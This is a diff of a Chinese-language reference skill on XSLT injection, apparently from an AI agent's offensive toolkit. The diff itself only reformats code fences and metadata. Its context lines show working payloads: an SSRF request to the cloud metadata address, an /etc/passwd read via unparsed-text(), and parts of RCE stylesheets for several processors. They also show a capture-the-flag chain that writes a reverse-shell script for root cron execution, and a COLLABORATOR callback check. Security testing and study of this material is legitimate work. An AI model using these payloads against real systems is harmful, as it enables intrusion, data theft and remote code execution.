@@ -1,10 +1,10 @@
 ---
 name: 'xslt-injection'
-description: 'XSLT 注入全集：PHP(libxslt)/Java(Xalan,Saxon)/.NET 四大处理器 RCE payload + 文件读/SSRF/端口扫描/OOB。Conversor HTB 来源。与 [[xml-attacks-beyond-xxe]] 互补。'
+description: 'XSLT 注入全集：PHP(libxslt)/Java(Xalan,Saxon)/.NET 四大处理器 RCE payload + 文件读/SSRF/端口扫描/OOB。Conversor HTB 来源。与 xml-attacks-beyond-xxe 互补。'
 disable-model-invocation: true
 metadata: { domain: web, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+
 
 # XSLT Injection — 完整攻击参考
 
@@ -32,7 +32,7 @@ metadata: { domain: web, tier: T2 }
 <!-- libxslt → "libxslt" | Saxon → "SAXON" | Xalan → "Apache" | MS → "Microsoft" -->
 <xsl:value-of select="system-property('xsl:version')"/>
 <!-- 1.0 或 2.0 — 2.0 有 unparsed-text() -->
-```
+```text
 
 ## 各处理器 Payload 速查
 
@@ -64,7 +64,7 @@ metadata: { domain: web, tier: T2 }
 
 <!-- SSRF -->
 <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>
-```
+```text
 
 ### Java / Xalan-J
 
@@ -78,7 +78,7 @@ metadata: { domain: web, tier: T2 }
     <xsl:value-of select="$proc"/>
   </xsl:template>
 </xsl:stylesheet>
-```
+```text
 
 ### Java / Saxon (PE/EE)
 
@@ -93,7 +93,7 @@ metadata: { domain: web, tier: T2 }
 
 <!-- 完整文件读: unparsed-text() — XSLT 2.0 -->
 <xsl:value-of select="unparsed-text('/etc/passwd')"/>
-```
+```text
 
 ### .NET (XslCompiledTransform — 仅 .NET Framework)
 
@@ -117,13 +117,13 @@ metadata: { domain: web, tier: T2 }
     <xsl:value-of select="user:exec()"/>
   </xsl:template>
 </xsl:stylesheet>
-```
+```text
 
 ## 实战链：XSLT 写文件 → cron 执行
 
 > Conversor HTB 案例 — 组合路径穿越 + XSLT 写文件
 
-```
+```text
 弱点:
   ① os.path.join(UPLOAD_FOLDER, xml_file.filename) — 无过滤 → 路径穿越
   ② etree.parse(xslt_path) — XSLT 处理无安全限制
@@ -135,17 +135,17 @@ metadata: { domain: web, tier: T2 }
   XSLT 写恶意 Python: ex:document href="../scripts/rev.py"
   ↓
   cron 每分钟执行 → rev.py 以 root 运行 → RCE
-```
+```text
 
 ## XSLT vs XXE 检测决策树
 
-```
+```text
 [ ] 端点接受 .xsl/.xslt 文件? → 直接试 XSLT ✅
 [ ] 参数名 xslt/xsl/stylesheet/template? → 试 XSLT ✅
 [ ] XXE 试了不通? → 可能 XSLT 没被限制 → 试 document() ✅
 [ ] 7*7 反射成 49? → XSLT 确认 ✅
 [ ] document('http://COLLABORATOR/') 有回调? → SSRF 确认 → 二者之一
-```
+```text
 
 ## 不同处理器指纹速查
 
